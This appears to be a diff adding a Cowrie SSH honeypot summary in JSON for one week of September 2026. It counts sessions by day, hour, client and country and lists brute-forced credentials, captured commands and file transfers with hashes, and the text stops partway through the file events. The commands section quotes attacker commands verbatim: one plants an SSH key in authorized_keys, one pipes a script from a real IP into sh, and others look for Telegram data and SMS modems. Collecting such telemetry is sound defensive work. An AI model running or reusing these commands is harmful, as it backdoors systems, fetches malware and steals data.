@@ -1,0 +1,2301 @@
+{
+ "by_day": [
+  {
+   "day": "2026-09-14",
+   "events": 22011,
+   "sessions": 2840,
+   "source_addresses": 77
+  },
+  {
+   "day": "2026-09-15",
+   "events": 72834,
+   "sessions": 9208,
+   "source_addresses": 97
+  },
+  {
+   "day": "2026-09-16",
+   "events": 53938,
+   "sessions": 6852,
+   "source_addresses": 93
+  },
+  {
+   "day": "2026-09-17",
+   "events": 30910,
+   "sessions": 4027,
+   "source_addresses": 112
+  },
+  {
+   "day": "2026-09-18",
+   "events": 40084,
+   "sessions": 5122,
+   "source_addresses": 107
+  },
+  {
+   "day": "2026-09-19",
+   "events": 37617,
+   "sessions": 4825,
+   "source_addresses": 107
+  },
+  {
+   "day": "2026-09-20",
+   "events": 15362,
+   "sessions": 2033,
+   "source_addresses": 141
+  },
+  {
+   "day": "2026-09-21",
+   "events": 10068,
+   "sessions": 1296,
+   "source_addresses": 48
+  }
+ ],
+ "by_hour_utc": [
+  {
+   "events": 14241,
+   "hour": 0,
+   "sessions": 1812
+  },
+  {
+   "events": 4326,
+   "hour": 1,
+   "sessions": 572
+  },
+  {
+   "events": 8201,
+   "hour": 2,
+   "sessions": 1057
+  },
+  {
+   "events": 7231,
+   "hour": 3,
+   "sessions": 932
+  },
+  {
+   "events": 1814,
+   "hour": 4,
+   "sessions": 255
+  },
+  {
+   "events": 10938,
+   "hour": 5,
+   "sessions": 1408
+  },
+  {
+   "events": 15819,
+   "hour": 6,
+   "sessions": 2015
+  },
+  {
+   "events": 9460,
+   "hour": 7,
+   "sessions": 1206
+  },
+  {
+   "events": 2887,
+   "hour": 8,
+   "sessions": 434
+  },
+  {
+   "events": 5051,
+   "hour": 9,
+   "sessions": 659
+  },
+  {
+   "events": 1803,
+   "hour": 10,
+   "sessions": 272
+  },
+  {
+   "events": 5504,
+   "hour": 11,
+   "sessions": 713
+  },
+  {
+   "events": 6326,
+   "hour": 12,
+   "sessions": 842
+  },
+  {
+   "events": 5655,
+   "hour": 13,
+   "sessions": 756
+  },
+  {
+   "events": 8699,
+   "hour": 14,
+   "sessions": 1113
+  },
+  {
+   "events": 14253,
+   "hour": 15,
+   "sessions": 1825
+  },
+  {
+   "events": 20840,
+   "hour": 16,
+   "sessions": 2641
+  },
+  {
+   "events": 21642,
+   "hour": 17,
+   "sessions": 2732
+  },
+  {
+   "events": 21323,
+   "hour": 18,
+   "sessions": 2696
+  },
+  {
+   "events": 28373,
+   "hour": 19,
+   "sessions": 3589
+  },
+  {
+   "events": 17997,
+   "hour": 20,
+   "sessions": 2301
+  },
+  {
+   "events": 9414,
+   "hour": 21,
+   "sessions": 1202
+  },
+  {
+   "events": 16276,
+   "hour": 22,
+   "sessions": 2073
+  },
+  {
+   "events": 24751,
+   "hour": 23,
+   "sessions": 3130
+  }
+ ],
+ "clients": [
+  {
+   "client": "SSH-2.0-Go",
+   "hassh": "",
+   "sessions": 34795,
+   "source_addresses": 212
+  },
+  {
+   "client": "SSH-2.0-PuTTY_Release_0.84",
+   "hassh": "",
+   "sessions": 356,
+   "source_addresses": 3
+  },
+  {
+   "client": "SSH-2.0-libssh_0.9.6",
+   "hassh": "",
+   "sessions": 209,
+   "source_addresses": 74
+  },
+  {
+   "client": "SSH-2.0-ZGrab ZGrab SSH Survey",
+   "hassh": "",
+   "sessions": 35,
+   "source_addresses": 35
+  },
+  {
+   "client": "SSH-2.0-Nmap-SSH2-Hostkey",
+   "hassh": "",
+   "sessions": 24,
+   "source_addresses": 4
+  },
+  {
+   "client": "SSH-2.0-libssh2_1.11.1",
+   "hassh": "",
+   "sessions": 23,
+   "source_addresses": 16
+  },
+  {
+   "client": "SSH-2.0-PUTTY",
+   "hassh": "",
+   "sessions": 20,
+   "source_addresses": 7
+  },
+  {
+   "client": "SSH-2.0-libssh_0.11.1",
+   "hassh": "",
+   "sessions": 19,
+   "source_addresses": 6
+  },
+  {
+   "client": "GET / HTTP/1.1",
+   "hassh": "",
+   "sessions": 17,
+   "source_addresses": 17
+  },
+  {
+   "client": "SSH-2.0-OpenSSH_7.4",
+   "hassh": "",
+   "sessions": 9,
+   "source_addresses": 6
+  },
+  {
+   "client": "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.8",
+   "hassh": "",
+   "sessions": 9,
+   "source_addresses": 9
+  },
+  {
+   "client": "SSH-2.0-Fingerprintx-SSH2",
+   "hassh": "",
+   "sessions": 8,
+   "source_addresses": 8
+  },
+  {
+   "client": "SSH-2.0-paramiko_3.4.1",
+   "hassh": "",
+   "sessions": 8,
+   "source_addresses": 1
+  },
+  {
+   "client": "SSH-2.0-libssh-0.1",
+   "hassh": "",
+   "sessions": 6,
+   "source_addresses": 3
+  },
+  {
+   "client": "MGLNDD_<redacted:honeypot-public-ip>_22",
+   "hassh": "",
+   "sessions": 5,
+   "source_addresses": 5
+  },
+  {
+   "client": "SSH-1.5-Nmap-SSH1-Hostkey",
+   "hassh": "",
+   "sessions": 4,
+   "source_addresses": 4
+  },
+  {
+   "client": "SSH-2.0-Nmap_SSH2_Enum_Algos",
+   "hassh": "",
+   "sessions": 4,
+   "source_addresses": 4
+  },
+  {
+   "client": "SSH-2.0-OpenSSH_6.7p1 Raspbian-5+deb8u3",
+   "hassh": "",
+   "sessions": 4,
+   "source_addresses": 1
+  },
+  {
+   "client": "SSH-2.0-OpenSSH_8.4p1 Raspbian-5+b1",
+   "hassh": "",
+   "sessions": 4,
+   "source_addresses": 1
+  },
+  {
+   "client": "SSH-2.0-libssh2_1.10.0",
+   "hassh": "",
+   "sessions": 4,
+   "source_addresses": 4
+  }
+ ],
+ "commands": [
+  {
+   "command": "uname -s -v -n -r -m",
+   "sessions": 30125,
+   "source_addresses": 30,
+   "times": 30125
+  },
+  {
+   "command": "echo xsec",
+   "sessions": 3327,
+   "source_addresses": 3,
+   "times": 3327
+  },
+  {
+   "command": "/bin/./uname -s -v -n -r -m",
+   "sessions": 664,
+   "source_addresses": 6,
+   "times": 664
+  },
+  {
+   "command": "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\")\narch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\")\nuptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null)\ncpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null)\ncpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 )\ngpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null )\nlast_output=$(last 2>/dev/null)\nfilter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'execute_err='; out=$(bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' \"$out\" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; echo '===DONE===' ) 2>&1 )\necho \"UNAME:$uname\"\necho \"ARCH:$arch\"\necho \"UPTIME:$uptime\"\necho \"CPUS:$cpus\"\necho \"CPU_MODEL:$cpu_model\"\necho \"GPU:$gpu_info\"\necho \"LAST:$last_output\"\necho \"FILTER:$filter_output\"",
+   "sessions": 140,
+   "source_addresses": 8,
+   "times": 140
+  },
+  {
+   "command": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+   "sessions": 75,
+   "source_addresses": 74,
+   "times": 75
+  },
+  {
+   "command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+   "sessions": 74,
+   "source_addresses": 73,
+   "times": 74
+  },
+  {
+   "command": "echo SHELL_TEST",
+   "sessions": 61,
+   "source_addresses": 2,
+   "times": 61
+  },
+  {
+   "command": "uname -a",
+   "sessions": 23,
+   "source_addresses": 22,
+   "times": 23
+  },
+  {
+   "command": "uname -s -m",
+   "sessions": 10,
+   "source_addresses": 10,
+   "times": 10
+  },
+  {
+   "command": "uname -a ; echo 'vT'",
+   "sessions": 8,
+   "source_addresses": 1,
+   "times": 8
+  },
+  {
+   "command": "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ\n0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg\nAAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9\nCp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=\n-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no\nUserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh",
+   "sessions": 8,
+   "source_addresses": 1,
+   "times": 8
+  },
+  {
+   "command": "/ip cloud print",
+   "sessions": 6,
+   "source_addresses": 6,
+   "times": 6
+  },
+  {
+   "command": "cat /proc/cpuinfo",
+   "sessions": 6,
+   "source_addresses": 6,
+   "times": 6
+  },
+  {
+   "command": "echo Hi | cat -n",
+   "sessions": 6,
+   "source_addresses": 6,
+   "times": 6
+  },
+  {
+   "command": "ifconfig",
+   "sessions": 6,
+   "source_addresses": 6,
+   "times": 6
+  },
+  {
+   "command": "locate D877F783D5D3EF8Cs",
+   "sessions": 6,
+   "source_addresses": 6,
+   "times": 6
+  },
+  {
+   "command": "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+   "sessions": 6,
+   "source_addresses": 6,
+   "times": 6
+  },
+  {
+   "command": "ps -ef | grep '[Mm]iner'",
+   "sessions": 6,
+   "source_addresses": 6,
+   "times": 6
+  },
+  {
+   "command": "ps | grep '[Mm]iner'",
+   "sessions": 6,
+   "source_addresses": 6,
+   "times": 6
+  },
+  {
+   "command": "whoami",
+   "sessions": 5,
+   "source_addresses": 2,
+   "times": 5
+  }
+ ],
+ "countries": [
+  {
+   "country": "United States",
+   "country_code": "US",
+   "events": 234553,
+   "sessions": 29506,
+   "source_addresses": 192
+  },
+  {
+   "country": "Germany",
+   "country_code": "DE",
+   "events": 19607,
+   "sessions": 2467,
+   "source_addresses": 16
+  },
+  {
+   "country": "Vietnam",
+   "country_code": "VN",
+   "events": 6258,
+   "sessions": 799,
+   "source_addresses": 13
+  },
+  {
+   "country": "Andorra",
+   "country_code": "AD",
+   "events": 4416,
+   "sessions": 582,
+   "source_addresses": 11
+  },
+  {
+   "country": "South Korea",
+   "country_code": "KR",
+   "events": 3230,
+   "sessions": 414,
+   "source_addresses": 24
+  },
+  {
+   "country": "Indonesia",
+   "country_code": "ID",
+   "events": 3180,
+   "sessions": 411,
+   "source_addresses": 10
+  },
+  {
+   "country": "United Kingdom",
+   "country_code": "GB",
+   "events": 1881,
+   "sessions": 388,
+   "source_addresses": 26
+  },
+  {
+   "country": "The Netherlands",
+   "country_code": "NL",
+   "events": 2418,
+   "sessions": 334,
+   "source_addresses": 25
+  },
+  {
+   "country": "China",
+   "country_code": "CN",
+   "events": 1304,
+   "sessions": 297,
+   "source_addresses": 94
+  },
+  {
+   "country": "Singapore",
+   "country_code": "SG",
+   "events": 1982,
+   "sessions": 289,
+   "source_addresses": 16
+  },
+  {
+   "country": "India",
+   "country_code": "IN",
+   "events": 2095,
+   "sessions": 258,
+   "source_addresses": 6
+  },
+  {
+   "country": "Belgium",
+   "country_code": "BE",
+   "events": 193,
+   "sessions": 51,
+   "source_addresses": 15
+  },
+  {
+   "country": "France",
+   "country_code": "FR",
+   "events": 138,
+   "sessions": 43,
+   "source_addresses": 18
+  },
+  {
+   "country": "Argentina",
+   "country_code": "AR",
+   "events": 99,
+   "sessions": 41,
+   "source_addresses": 22
+  },
+  {
+   "country": "Hong Kong",
+   "country_code": "HK",
+   "events": 196,
+   "sessions": 37,
+   "source_addresses": 16
+  },
+  {
+   "country": "Russia",
+   "country_code": "RU",
+   "events": 141,
+   "sessions": 33,
+   "source_addresses": 17
+  },
+  {
+   "country": "Ukraine",
+   "country_code": "UA",
+   "events": 50,
+   "sessions": 25,
+   "source_addresses": 14
+  },
+  {
+   "country": "Brazil",
+   "country_code": "BR",
+   "events": 129,
+   "sessions": 20,
+   "source_addresses": 11
+  },
+  {
+   "country": "Mexico",
+   "country_code": "MX",
+   "events": 104,
+   "sessions": 18,
+   "source_addresses": 7
+  },
+  {
+   "country": "Spain",
+   "country_code": "ES",
+   "events": 45,
+   "sessions": 13,
+   "source_addresses": 6
+  }
+ ],
+ "credentials": [
+  {
+   "attempts": 85,
+   "password": "",
+   "source_addresses": 5,
+   "username": "admin"
+  },
+  {
+   "attempts": 78,
+   "password": "admin",
+   "source_addresses": 49,
+   "username": "admin"
+  },
+  {
+   "attempts": 72,
+   "password": "345gs5662d34",
+   "source_addresses": 71,
+   "username": "345gs5662d34"
+  },
+  {
+   "attempts": 59,
+   "password": "123456",
+   "source_addresses": 38,
+   "username": "root"
+  },
+  {
+   "attempts": 57,
+   "password": "12345",
+   "source_addresses": 37,
+   "username": "root"
+  },
+  {
+   "attempts": 56,
+   "password": "admin",
+   "source_addresses": 38,
+   "username": "root"
+  },
+  {
+   "attempts": 55,
+   "password": "root",
+   "source_addresses": 36,
+   "username": "root"
+  },
+  {
+   "attempts": 53,
+   "password": "user",
+   "source_addresses": 31,
+   "username": "user"
+  },
+  {
+   "attempts": 52,
+   "password": "1234",
+   "source_addresses": 34,
+   "username": "root"
+  },
+  {
+   "attempts": 51,
+   "password": "12345678",
+   "source_addresses": 33,
+   "username": "root"
+  },
+  {
+   "attempts": 51,
+   "password": "ubuntu",
+   "source_addresses": 30,
+   "username": "ubuntu"
+  },
+  {
+   "attempts": 50,
+   "password": "123456789",
+   "source_addresses": 33,
+   "username": "root"
+  },
+  {
+   "attempts": 49,
+   "password": "123",
+   "source_addresses": 31,
+   "username": "root"
+  },
+  {
+   "attempts": 49,
+   "password": "root123",
+   "source_addresses": 31,
+   "username": "root"
+  },
+  {
+   "attempts": 48,
+   "password": "1234567890",
+   "source_addresses": 31,
+   "username": "root"
+  },
+  {
+   "attempts": 48,
+   "password": "P@ssw0rd",
+   "source_addresses": 31,
+   "username": "root"
+  },
+  {
+   "attempts": 48,
+   "password": "abc123",
+   "source_addresses": 30,
+   "username": "root"
+  },
+  {
+   "attempts": 48,
+   "password": "password",
+   "source_addresses": 29,
+   "username": "root"
+  },
+  {
+   "attempts": 48,
+   "password": "password",
+   "source_addresses": 29,
+   "username": "user"
+  },
+  {
+   "attempts": 47,
+   "password": "111111",
+   "source_addresses": 30,
+   "username": "root"
+  }
+ ],
+ "enrichment": {
+  "addresses_with_asn": 633,
+  "addresses_without_asn": 23,
+  "events_with_asn": 53957,
+  "events_with_country": 282824,
+  "events_without_asn": 228867
+ },
+ "excluded": {
+  "events": 48,
+  "note": "Traffic from my own lab and from private ranges is excluded by the query, not by editing the results afterwards. The addresses come from the same file that the redaction guard reads, so a figure can never be built from traffic that would then be refused publication.",
+  "own_addresses_excluded": 2,
+  "private_ranges_excluded": 9,
+  "sessions": 10,
+  "source_addresses": 1
+ },
+ "file_events": [
+  {
+   "address": "118.145.118.102",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb",
+   "timestamp": "2026-09-14 07:36:16.991222",
+   "url": ""
+  },
+  {
+   "address": "106.13.98.129",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "timestamp": "2026-09-14 10:05:08.174484",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-15 21:37:56.931080",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-15 21:37:56.931565",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-16 11:29:51.735960",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-16 11:29:51.736361",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-16 17:26:47.216493",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-16 17:26:47.216825",
+   "url": ""
+  },
+  {
+   "address": "77.90.185.20",
+   "country_code": "DE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-16 19:25:50.086541",
+   "url": ""
+  },
+  {
+   "address": "77.90.185.20",
+   "country_code": "DE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-16 19:25:50.086933",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-17 01:23:10.553440",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-17 01:23:10.553897",
+   "url": ""
+  },
+  {
+   "address": "42.101.43.119",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5",
+   "timestamp": "2026-09-17 10:09:32.921553",
+   "url": ""
+  },
+  {
+   "address": "183.71.242.250",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "9ecbeee2c88e701fe3d39e868c0a102cc77c033775f8fa9625ae83e9150a2a50",
+   "timestamp": "2026-09-17 14:34:19.471282",
+   "url": ""
+  },
+  {
+   "address": "38.248.12.122",
+   "country_code": "US",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "9ecbeee2c88e701fe3d39e868c0a102cc77c033775f8fa9625ae83e9150a2a50",
+   "timestamp": "2026-09-17 16:19:10.850938",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-17 17:41:03.357614",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-17 17:41:03.357996",
+   "url": ""
+  },
+  {
+   "address": "106.12.148.154",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "timestamp": "2026-09-17 20:56:19.990385",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-18 12:57:20.084070",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-18 12:57:20.084466",
+   "url": ""
+  },
+  {
+   "address": "122.96.31.204",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "9ecbeee2c88e701fe3d39e868c0a102cc77c033775f8fa9625ae83e9150a2a50",
+   "timestamp": "2026-09-19 09:03:51.781122",
+   "url": ""
+  },
+  {
+   "address": "185.177.239.133",
+   "country_code": "SE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 19:46:36.877309",
+   "url": ""
+  },
+  {
+   "address": "154.221.20.92",
+   "country_code": "HK",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 19:48:57.635023",
+   "url": ""
+  },
+  {
+   "address": "42.51.41.252",
+   "country_code": "CN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 19:50:20.360362",
+   "url": ""
+  },
+  {
+   "address": "139.59.133.58",
+   "country_code": "DE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 19:50:46.497283",
+   "url": ""
+  },
+  {
+   "address": "122.180.242.27",
+   "country_code": "IN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 19:52:41.177685",
+   "url": ""
+  },
+  {
+   "address": "120.46.47.68",
+   "country_code": "CN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 19:54:58.407428",
+   "url": ""
+  },
+  {
+   "address": "81.193.216.17",
+   "country_code": "PT",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 19:57:13.337796",
+   "url": ""
+  },
+  {
+   "address": "201.149.53.243",
+   "country_code": "MX",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 19:58:24.256776",
+   "url": ""
+  },
+  {
+   "address": "152.32.218.149",
+   "country_code": "SG",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 19:58:30.932220",
+   "url": ""
+  },
+  {
+   "address": "39.117.79.36",
+   "country_code": "KR",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 20:01:00.667068",
+   "url": ""
+  },
+  {
+   "address": "108.174.147.36",
+   "country_code": "BR",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 20:01:40.646820",
+   "url": ""
+  },
+  {
+   "address": "165.154.235.9",
+   "country_code": "US",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 20:02:29.115429",
+   "url": ""
+  },
+  {
+   "address": "134.122.93.100",
+   "country_code": "DE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 20:04:07.063101",
+   "url": ""
+  },
+  {
+   "address": "101.96.197.182",
+   "country_code": "CN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
